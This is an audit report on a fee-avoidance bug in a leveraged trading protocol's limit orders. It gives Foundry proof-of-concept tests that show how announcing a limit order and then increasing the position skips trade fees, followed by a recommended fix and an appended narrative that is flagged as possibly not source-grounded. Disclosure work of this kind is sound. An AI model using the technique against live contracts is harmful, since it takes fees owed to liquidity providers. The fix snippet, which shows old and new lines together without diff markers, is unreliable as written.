---
id: 22444
severity: "High"
---

# Trade fees can be avoided in limit orders

## Description

On limit order announcement the trade fee is calculated based on the current size of the position and its value is used on the execution of the limit order. However, it is not taken into account that the value of additionalSize in the position can have changed since the limit order was announced, so users can avoid paying trade fees for closing leveraged positions at the expense of LPs.  

When a user announces a limit order to close a leveraged position the trade fee is calculated based on the current trade fee rate and the additionalSize of the position and stored in the _limitOrderClose mapping.  

On the execution of the limit order, the value of the trade fee recorded in the _limitOrderClose mapping is used to build the AnnouncedLeverageClose struct that is sent to the LeverageModule:executeClose function. In this function the trade fee is used to pay the stable LPs and subtracted from the total amount received by the user closing the position.  

However, it is not taken into account that the value of additionalSize in the position can have changed since the limit order was announced via the LeverageModule:executeAdjust function.  

As a result, users that want to open a limit order can do so using the minimum additionalSize possible and then increase it after the limit order is announced, avoiding paying the trade fee for the additional size adjustment.  

It is also worth mentioning that the trade fee rate can change between the announcement and the execution of the limit order, so the trade fee calculated at the announcement time can be different from the one used at the execution time. Although this scenario is much less likely to happen (requires the governance to change the trade fee rate) and its impact is much lower (the trade fee rate is not likely to change significantly).  

Users can avoid paying trade fees for closing leveraged positions at the expense of UNIT LPs, that should have received the trade fee.

## Proof of Concept

The following tests show the example of a user that opens a limit order to be executed when the price doubles.  
The operations performed in both tests are identical, but the order of the operations is different, so we can see how a user can exploit the system to avoid paying trade fees.  

To reproduce it add the following code to AdjustPositionTest contract and run forge test --mt test_LimitTradeFee -vv:  
```solidity
function test_LimitTradeFee_ExpectedBehaviour() public {
    uint256 aliceCollateralBalanceBefore = WETH.balanceOf(alice);
    uint256 collateralPrice = 1000e8;
    announceAndExecuteDeposit({
        traderAccount: bob,
        keeperAccount: keeper,
        depositAmount: 10000e18,
        oraclePrice: collateralPrice,
        keeperFeeAmount: 0
    });
    // Create small leverage position
    uint256 initialMargin = 0.05e18;
    uint256 initialSize = 0.1e18;
    uint256 tokenId = announceAndExecuteLeverageOpen({
        traderAccount: alice,
        keeperAccount: keeper,
        margin: initialMargin,
        additionalSize: initialSize,
        oraclePrice: collateralPrice,
        keeperFeeAmount: 0
    });
    // Increase margin and size in position
    uint256 adjustmentTradeFee = announceAndExecuteLeverageAdjust({
        tokenId: tokenId,
        traderAccount: alice,
        keeperAccount: keeper,
        marginAdjustment: 100e18,
        additionalSizeAdjustment: 2400e18,
        oraclePrice: collateralPrice,
        keeperFeeAmount: 0
    });
    // Anounce limit order to close position at 2x price
    vm.startPrank(alice);
    limitOrderProxy.announceLimitOrder({
        tokenId: tokenId,
        priceLowerThreshold: 0,
        priceUpperThreshold: collateralPrice * 2
    });
    // Collateral price doubles after 1 month and the order is executed
    skip(4 weeks);
    collateralPrice = collateralPrice * 2;
    setWethPrice(collateralPrice);
    bytes[] memory priceUpdateData = getPriceUpdateData(collateralPrice);
    vm.startPrank(keeper);
    limitOrderProxy.executeLimitOrder{value: 1}(tokenId, priceUpdateData);
    uint256 aliceCollateralBalanceAfter = WETH.balanceOf(alice);
    console2.log("profit:", aliceCollateralBalanceAfter - aliceCollateralBalanceBefore);
}
```
```solidity
function test_LimitTradeFee_PayLessFees() public {
    uint256 aliceCollateralBalanceBefore = WETH.balanceOf(alice);
    uint256 collateralPrice = 1000e8;
    announceAndExecuteDeposit({
        traderAccount: bob,
        keeperAccount: keeper,
        depositAmount: 10000e18,
        oraclePrice: collateralPrice,
        keeperFeeAmount: 0
    });
    // Create small leverage position
    uint256 initialMargin = 0.05e18;
    uint256 initialSize = 0.1e18;
    uint256 tokenId = announceAndExecuteLeverageOpen({
        traderAccount: alice,
        keeperAccount: keeper,
        margin: initialMargin,
        additionalSize: initialSize,
        oraclePrice: collateralPrice,
        keeperFeeAmount: 0
    });
    // Anounce limit order to close position at 2x price
    vm.startPrank(alice);
    limitOrderProxy.announceLimitOrder({
        tokenId: tokenId,
        priceLowerThreshold: 0,
        priceUpperThreshold: collateralPrice * 2
    });
    // Increase margin and size in position
    uint256 adjustmentTradeFee = announceAndExecuteLeverageAdjust({
        tokenId: tokenId,
        traderAccount: alice,
        keeperAccount: keeper,
        marginAdjustment: 100e18,
        additionalSizeAdjustment: 2400e18,
        oraclePrice: collateralPrice,
        keeperFeeAmount: 0
    });
    // Collateral price doubles after 1 month and the order is executed
    skip(4 weeks);
    collateralPrice = collateralPrice * 2;
    setWethPrice(collateralPrice);
    bytes[] memory priceUpdateData = getPriceUpdateData(collateralPrice);
    vm.startPrank(keeper);
    limitOrderProxy.executeLimitOrder{value: 1}(tokenId, priceUpdateData);
    uint256 aliceCollateralBalanceAfter = WETH.balanceOf(alice);
    console2.log("profit:", aliceCollateralBalanceAfter - aliceCollateralBalanceBefore);
}
```
[PASS] test_LimitTradeFee_ExpectedBehaviour() (gas: 2457623)  
Logs:  
profit: 1195246800000000000000  

[PASS] test_LimitTradeFee_PayLessFees() (gas: 2441701)  
Logs:  
profit: 1197646800000000000000  

Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 21.23ms  

As we can see, in the second case the user was able to get a profit 2.4 rETH higher, corresponding to the trade fee avoided for the additional size adjustment done after creating the limit order (2,400 rETH * 0.1% fee). That higher profit has come at the expense of LPs, who should have received the trade fee.

## Recommendation

Calculate the trade fee at the execution time of the limit order, in the same way it is done for stable withdrawals for the withdrawal fee.  
File: LimitOrder.sol  
```solidity
uint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(
    vault.getPosition(tokenId).additionalSize
);
order.orderData = abi.encode(
    FlatcoinStructs.AnnouncedLeverageClose({
        tokenId: tokenId,
        minFillPrice: minFillPrice,
        tradeFee: _limitOrder.tradeFee
        tradeFee: tradeFee
    })
);
```  
A maxTradeFee parameter can also be added at the announcement time to avoid the trade fee being higher than a certain value.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a trade‑fee avoidance bug that occurs in the limit‑order workflow of a leveraged trading module. When a user announces a limit order to close a leveraged position, the contract records the trade fee based on the position’s additionalSize and the current fee rate at that moment. However, the recorded fee is stored statically in the _limitOrderClose mapping and is later reused during execution without being recomputed. Because the additionalSize of the position can be altered after the announcement via an adjust operation, a malicious user can announce a limit order with the smallest possible additionalSize, then increase the size (and consequently the notional value) before the order is executed. The execution step reads the stale fee value, which reflects the smaller size, and therefore subtracts a lower fee from the proceeds. The user therefore receives a larger net amount, while the liquidity providers (LPs) that are supposed to be compensated by the trade fee receive less than they are owed. The bug also has a secondary, less likely dimension: the global trade‑fee rate may be changed by governance between announcement and execution, causing a mismatch between the fee calculated at announcement and the fee that should apply at execution. The issue manifests only when a limit order is announced and later the position is adjusted before the order is filled, which is a realistic scenario in leveraged trading where users frequently rebalance positions. It was discovered during a security audit by constructing two test cases: one where the position is adjusted before announcing the limit order (expected behaviour) and another where the limit order is announced first and the position is adjusted afterwards (fee avoidance). The discrepancy is subtle because the contract still deducts a fee; the difference is hidden in the accounting of LPs, making it hard to notice without explicit fee‑reconciliation checks. To remediate, the trade fee should be calculated at execution time using the current additionalSize and fee rate, mirroring the logic used for stable withdrawals, and optionally a maxTradeFee parameter can be stored at announcement to bound the fee. This change ensures that any size adjustments or fee‑rate changes are reflected in the fee charged, preserving the economic model and protecting LPs from fee loss.
